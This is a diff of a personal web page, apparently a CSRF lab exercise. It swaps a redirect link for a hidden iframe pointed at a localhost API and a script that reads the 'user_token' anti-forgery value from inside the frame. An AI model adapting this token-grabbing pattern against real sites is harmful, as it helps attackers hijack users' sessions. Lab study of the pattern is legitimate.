@@ -77,21 +77,16 @@
          
           </h5>
           <a class="btn btn-primary btn-xl" href="#about">More About May</a>
-          <h1>Click the link to redirect</h1>
-           <!-- Add an event listener to the link to redirect on click -->
-          <a href="#" id="redirectLink">Redirect to Another Web Link</a>
-          <script src="csrf_example.js"></script>
+          <script charset="utf-8">
+            function getToken(){
+            var iframe = document.getElementById("iframe");
+            var doc = iframe.contentDocument ? iframe.contentDocument: iframe.contentWindow.document;
+            var token = doc.getElementsByName("user_token")[0].value;
+            console.log("Token:", token);
+          }
+        </script>
+        <iframe id="iframe" onload="javascript:getToken();" src="http://localhost:8080/api/users" style="display:none;"></iframe>
 
-      <!-- Add an event listener to the link to redirect on click -->
-      <script>
-        document.getElementById('redirectLink').addEventListener('click', function (event) {
-            // Prevent the default link behavior (e.g., navigating to another page)
-            event.preventDefault();
-            // Redirect to another web link
-           window.location.href = 'http://localhost:8080';  // Replace with your desired URL
-       });
-         executeScript();
-    </script>
         </div>
 
         
